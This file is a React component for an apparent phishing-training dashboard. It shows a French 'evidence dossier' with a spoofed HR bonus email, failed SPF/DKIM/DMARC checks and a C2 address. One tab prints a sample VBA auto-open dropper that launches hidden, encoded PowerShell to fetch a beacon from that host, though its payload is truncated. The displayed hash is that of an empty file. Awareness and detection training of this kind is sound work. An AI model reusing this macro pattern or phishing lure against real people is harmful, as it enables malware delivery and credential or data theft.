import React, { useState } from 'react'
import { motion } from 'framer-motion'
import {
  FileText,
  AlertTriangle,
  Copy,
  Check,
  ExternalLink,
  Lock,
  Mail,
  Paperclip,
  CheckCircle2,
  XCircle,
  Hash,
  Download,
  Terminal,
  Play,
  ArrowRight,
} from 'lucide-react'
import { sound } from '../utils/audio'

interface PhishingPayloadDossierProps {
  onDetonatePayload?: () => void
  className?: string
}

export default function PhishingPayloadDossier({
  onDetonatePayload,
  className = '',
}: PhishingPayloadDossierProps) {
  const [copied, setCopied] = useState(false)
  const [activeTab, setActiveTab] = useState<'evidence' | 'headers' | 'body'>('evidence')

  const threatScore = 96
  const sha256 = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'

  const copyHash = () => {
    sound.playClick()
    navigator.clipboard.writeText(sha256)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const handleLaunch = () => {
    sound.playLaser()
    if (onDetonatePayload) onDetonatePayload()
  }

  // Calculate SVG arc for the 0-100% dial meter
  const radius = 38
  const circumference = 2 * Math.PI * radius
  const strokeDashoffset = circumference - (threatScore / 100) * circumference

  return (
    <div className={`bg-white border border-[#E3E8E6] rounded-2xl shadow-[0_2px_8px_-2px_rgba(21,23,26,0.04),0_1px_2px_rgba(21,23,26,0.02)] overflow-hidden font-sans select-none relative ${className}`}>
      {/* 1. Header with Top Attack Pill Badges & Warm Brick Red Launch Button */}
      <div className="p-6 sm:p-8 border-b border-[#E3E8E6] flex flex-wrap items-center justify-between gap-4 bg-white">
        <div className="space-y-2">
          {/* Top Pill Badges indicating attack type */}
          <div className="flex flex-wrap items-center gap-2">
            <span className="px-3 py-1 rounded-full bg-[#FDF1EF] border border-[#FACDC7] text-[#E04B3A] text-xs font-semibold uppercase tracking-wide flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-[#E04B3A] status-dot-pulse" />
              Spear-Phishing RH
            </span>
            <span className="px-3 py-1 rounded-full bg-[#E8F6F1] border border-[#BCE6D7] text-[#0D9B6E] text-xs font-semibold uppercase tracking-wide">
              Macro VBA Dropper
            </span>
            <span className="px-3 py-1 rounded-full bg-[#EDF2F1] border border-[#E3E8E6] text-[#4B5563] text-xs font-medium">
              CVE-2023-38831
            </span>
          </div>

          <h2 className="text-xl sm:text-2xl font-bold tracking-[-0.02em] text-[#15171A]">
            Dossier de Preuve : Piège du Phishing Salaires
          </h2>
          <p className="text-sm text-[#6B7280]">
            Analyse forensique du courriel malveillant envoyé aux cadres RH et détection de l'exfiltration.
          </p>
        </div>

        {/* Primary Warm Brick Red Launch Simulation CTA */}
        <button
          onClick={handleLaunch}
          className="px-6 py-3 rounded-xl bg-[#E04B3A] hover:bg-[#D63A2F] text-white text-sm font-semibold tracking-wide shadow-[0_2px_8px_rgba(224,75,58,0.25)] hover:shadow-[0_4px_14px_rgba(224,75,58,0.35)] flex items-center gap-2.5 transition-all active:translate-y-[1px]"
        >
          <Play size={16} className="fill-white" />
          <span>Launch Simulation</span>
          <ArrowRight size={16} />
        </button>
      </div>

      {/* 2. Metrics Row: Threat Confidence Dial & Soft Gray Metadata Tags */}
      <div className="p-6 sm:p-8 border-b border-[#E3E8E6] bg-[#F2F6F5] grid grid-cols-1 md:grid-cols-12 gap-6 items-center">
        {/* Threat Confidence Dial (0-100%) in clean floating white card */}
        <div className="md:col-span-4 flex items-center gap-4 p-5 bg-white rounded-2xl border border-[#E3E8E6] shadow-[0_2px_8px_-2px_rgba(21,23,26,0.04)]">
          <div className="relative w-20 h-20 shrink-0 flex items-center justify-center">
            <svg className="w-full h-full transform -rotate-90" viewBox="0 0 100 100">
              <circle
                cx="50"
                cy="50"
                r={radius}
                className="text-[#EDF2F1]"
                strokeWidth="8"
                stroke="currentColor"
                fill="transparent"
              />
              <circle
                cx="50"
                cy="50"
                r={radius}
                className="text-[#E04B3A] transition-all duration-1000 ease-out"
                strokeWidth="8"
                strokeDasharray={circumference}
                strokeDashoffset={strokeDashoffset}
                strokeLinecap="round"
                stroke="currentColor"
                fill="transparent"
              />
            </svg>
            <div className="absolute inset-0 flex flex-col items-center justify-center font-sans">
              <span className="text-xl font-extrabold text-[#E04B3A] leading-none tabular-nums">
                {threatScore}%
              </span>
              <span className="text-[9px] font-semibold text-[#6B7280] uppercase tracking-wider mt-0.5">
                Indice
              </span>
            </div>
          </div>

          <div>
            <span className="text-xs font-semibold text-[#E04B3A] tracking-wide uppercase block">
              Confidence Threat Rating
            </span>
            <div className="font-bold text-base text-[#15171A] mt-0.5">
              Sévérité Critique (P1)
            </div>
            <p className="text-xs text-[#6B7280] mt-1 leading-relaxed">
              Typosquattage de domaine RH et signature de macro furtive.
            </p>
          </div>
        </div>

        {/* Soft Metadata Tags in Secondary Surface */}
        <div className="md:col-span-8 grid grid-cols-1 sm:grid-cols-3 gap-3">
          <div className="p-4 bg-white rounded-2xl border border-[#E3E8E6] shadow-[0_1px_3px_rgba(21,23,26,0.04)]">
            <span className="text-[11px] font-semibold text-[#6B7280] uppercase tracking-wide block">
              Expéditeur Usurpé
            </span>
            <div className="font-bold text-xs text-[#15171A] truncate mt-1" title="rh-direction@societe-portail-rh.online">
              societe-portail-rh.online
            </div>
            <span className="inline-block mt-1 text-[11px] text-[#E04B3A] font-semibold">
              Typosquattage Détecté
            </span>
          </div>

          <div className="p-4 bg-white rounded-2xl border border-[#E3E8E6] shadow-[0_1px_3px_rgba(21,23,26,0.04)]">
            <span className="text-[11px] font-semibold text-[#6B7280] uppercase tracking-wide block">
              Pièce Jointe Armée
            </span>
            <div className="font-bold text-xs text-[#15171A] truncate mt-1">
              Mise_a_jour_salaires.docm
            </div>
            <span className="inline-block mt-1 text-[11px] text-[#D97706] font-semibold">
              Macro VBA Active (342 Ko)
            </span>
          </div>

          <div className="p-4 bg-white rounded-2xl border border-[#E3E8E6] shadow-[0_1px_3px_rgba(21,23,26,0.04)]">
            <span className="text-[11px] font-semibold text-[#6B7280] uppercase tracking-wide block">
              Serveur Relais C2
            </span>
            <div className="font-bold text-xs text-[#15171A] mt-1 font-mono">
              185.22.14.89:443
            </div>
            <span className="inline-block mt-1 text-[11px] text-[#0D9B6E] font-semibold">
              Sofia, BG (AS49320)
            </span>
          </div>
        </div>
      </div>

      {/* 3. Inactive & Active Pill Tabs */}
      <div className="flex items-center gap-2 px-6 sm:px-8 pt-4 pb-3 bg-white border-b border-[#E3E8E6]">
        {[
          { id: 'evidence', label: 'Preuve Sanitized' },
          { id: 'headers', label: 'En-têtes RFC822 (SPF/DKIM/DMARC)' },
          { id: 'body', label: 'Macro VBA Extraite' },
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => {
              sound.playClick()
              setActiveTab(tab.id as any)
            }}
            className={`px-4 py-2 rounded-full text-xs font-semibold transition-all ${
              activeTab === tab.id
                ? 'bg-[#15171A] text-white shadow-[0_1px_3px_rgba(21,23,26,0.12)]'
                : 'bg-[#EDF2F1] text-[#6B7280] hover:text-[#15171A] hover:bg-[#E3E8E6]'
            }`}
          >
            {tab.label}
          </button>
        ))}
      </div>

      {/* 4. Tab Content Panels with High Whitespace (p-6 to p-8) */}
      <div className="p-6 sm:p-8 bg-white">
        {activeTab === 'evidence' && (
          <div className="space-y-5">
            {/* Live Mail Simulation Card */}
            <div className="p-5 rounded-2xl bg-[#F2F6F5] border border-[#E3E8E6] text-xs space-y-3">
              <div className="flex items-center justify-between border-b border-[#E3E8E6] pb-3">
                <div>
                  <span className="text-[#6B7280] mr-2 font-medium">De :</span>
                  <span className="font-bold text-[#15171A]">Direction RH & Paie</span>
                  <span className="text-[#E04B3A] font-mono text-[11px] ml-2">
                    &lt;rh-direction@societe-portail-rh.online&gt;
                  </span>
                </div>
                <span className="text-[#6B7280] font-mono text-[11px]">09:14:22 CET</span>
              </div>

              <div className="flex items-center justify-between border-b border-[#E3E8E6] pb-3">
                <div>
                  <span className="text-[#6B7280] mr-2 font-medium">À :</span>
                  <span className="text-[#15171A] font-medium">Sophie Martin &lt;sophie.martin@groupe-meridian.com&gt;</span>
                </div>
                <span className="text-[11px] text-[#E04B3A] font-semibold bg-[#FDF1EF] px-2.5 py-0.5 rounded-full border border-[#FACDC7]">
                  Priorité Haute
                </span>
              </div>

              <div>
                <span className="text-[#6B7280] mr-2 font-medium">Objet :</span>
                <span className="font-bold text-[#15171A]">
                  [URGENT] Mise à jour obligatoire du barème des primes annuelles 2026
                </span>
              </div>

              {/* Message Body */}
              <div className="bg-white p-5 rounded-xl border border-[#E3E8E6] text-sm text-[#15171A] leading-relaxed space-y-3 shadow-[0_1px_2px_rgba(21,23,26,0.02)]">
                <p>Bonjour Sophie,</p>
                <p>
                  Veuillez trouver ci-joint la grille d’ajustement salarial validée par le comité de direction ce matin. Une action de vérification de votre part est impérativement requise avant 12h00 pour finaliser le virement des primes sur paie.
                </p>
                <div className="p-3 bg-[#EDF2F1] rounded-xl border border-[#E3E8E6] flex items-center justify-between max-w-md">
                  <div className="flex items-center gap-3">
                    <Paperclip size={18} className="text-[#0D9B6E]" />
                    <div>
                      <div className="font-bold text-xs text-[#15171A]">Mise_a_jour_salaires.docm</div>
                      <div className="text-[10px] text-[#6B7280]">Document Word avec Macros activées (342 Ko)</div>
                    </div>
                  </div>
                  <span className="text-[10px] font-bold px-2.5 py-0.5 rounded-full bg-[#FDF1EF] text-[#E04B3A] border border-[#FACDC7]">
                    PIÈGE ARTIFACT
                  </span>
                </div>
                <p className="text-xs text-[#6B7280] italic">
                  Note : Activez le contenu pour déverrouiller la table de calcul dynamique.
                </p>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'headers' && (
          <div className="space-y-5">
            <div className="grid sm:grid-cols-3 gap-4">
              <div className="p-4 bg-[#FDF1EF] border border-[#FACDC7] rounded-xl">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-xs text-[#E04B3A]">SPF CHECK</span>
                  <XCircle size={16} className="text-[#E04B3A]" />
                </div>
                <div className="text-xl font-extrabold text-[#E04B3A] mt-1 font-mono">FAIL</div>
                <p className="text-xs text-[#6B7280] mt-1">
                  L'adresse IP 185.22.14.89 n'est pas autorisée dans l'enregistrement SPF du domaine légitime.
                </p>
              </div>

              <div className="p-4 bg-[#FFFBEB] border border-[#FDE68A] rounded-xl">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-xs text-[#D97706]">DKIM SIGNATURE</span>
                  <AlertTriangle size={16} className="text-[#D97706]" />
                </div>
                <div className="text-xl font-extrabold text-[#D97706] mt-1 font-mono">ABSENT</div>
                <p className="text-xs text-[#6B7280] mt-1">
                  Aucune signature cryptographique présente dans le message.
                </p>
              </div>

              <div className="p-4 bg-[#FDF1EF] border border-[#FACDC7] rounded-xl">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-xs text-[#E04B3A]">DMARC POLICY</span>
                  <XCircle size={16} className="text-[#E04B3A]" />
                </div>
                <div className="text-xl font-extrabold text-[#E04B3A] mt-1 font-mono">QUARANTINE</div>
                <p className="text-xs text-[#6B7280] mt-1">
                  Politique stricte non satisfaite. Le message devait être consigné en quarantaine immédiate.
                </p>
              </div>
            </div>

            {/* Raw RFC822 Stream */}
            <div className="p-4 bg-[#15171A] text-slate-200 rounded-xl text-xs font-mono overflow-x-auto space-y-1">
              <div>Received: from smtp.relay-cloud.ru (185.22.14.89) by mailgw.groupe-meridian.com</div>
              <div>Return-Path: &lt;bounce-service-5892@societe-portail-rh.online&gt;</div>
              <div>X-Originating-IP: [185.22.14.89]</div>
              <div>Authentication-Results: mailgw.groupe-meridian.com; spf=fail smtp.mailfrom=societe-portail-rh.online;</div>
              <div>DKIM-Signature: none; dmarc=quarantine header.from=societe-portail-rh.online</div>
              <div>Content-Type: multipart/mixed; boundary="----=_Part_3842_9104.1726989262"</div>
            </div>
          </div>
        )}

        {activeTab === 'body' && (
          <div className="space-y-4">
            <div className="p-4 bg-[#EDF2F1] border border-[#E3E8E6] rounded-xl flex items-center justify-between">
              <div>
                <span className="text-xs font-semibold text-[#6B7280] uppercase tracking-wide">Macro VBA Stream (T1059.001)</span>
                <div className="font-bold text-sm text-[#15171A]">Sub Document_Open() — PowerShell Hidden Dropper</div>
              </div>
              <span className="text-xs font-bold text-[#E04B3A] bg-[#FDF1EF] px-3 py-1 rounded-full border border-[#FACDC7]">
                Base64 Obfusqué
              </span>
            </div>

            <pre className="p-4 bg-[#15171A] text-[#00A67E] rounded-xl text-xs font-mono overflow-x-auto leading-relaxed">
{`Private Sub Document_Open()
    On Error Resume Next
    Dim cmd As String
    ' Commande PowerShell furtive encodée exécutée sans fenêtre visible
    cmd = "powershell.exe -NoP -NonI -W Hidden -Enc aQBmACgAKABbAFMAeQBz..."
    Set sh = CreateObject("WScript.Shell")
    sh.Run cmd, 0, False
    ' Déclenche le téléchargement du beacon C2 depuis https://185.22.14.89:443
End Sub`}
            </pre>
          </div>
        )}
      </div>

      {/* 5. SHA-256 Hash & Copy Footer */}
      <div className="p-4 sm:p-6 bg-[#F2F6F5] border-t border-[#E3E8E6] flex flex-wrap items-center justify-between gap-3 text-xs">
        <div className="flex items-center gap-2 max-w-full truncate font-mono">
          <Hash size={14} className="text-[#6B7280] shrink-0" />
          <span className="text-[#6B7280] uppercase font-bold shrink-0">SHA256:</span>
          <span className="text-[#15171A] font-medium truncate tabular-nums">
            {sha256}
          </span>
        </div>

        <button
          onClick={copyHash}
          className="flex items-center gap-2 px-3.5 py-1.5 rounded-xl bg-white border border-[#E3E8E6] text-[#15171A] hover:bg-[#EDF2F1] text-xs font-semibold transition active:translate-y-[1px] shadow-[0_1px_2px_rgba(21,23,26,0.03)]"
        >
          {copied ? <Check size={13} className="text-[#0D9B6E]" /> : <Copy size={13} />}
          <span>{copied ? 'Hash Copié' : 'Copier SHA-256'}</span>
        </button>
      </div>
    </div>
  )
}
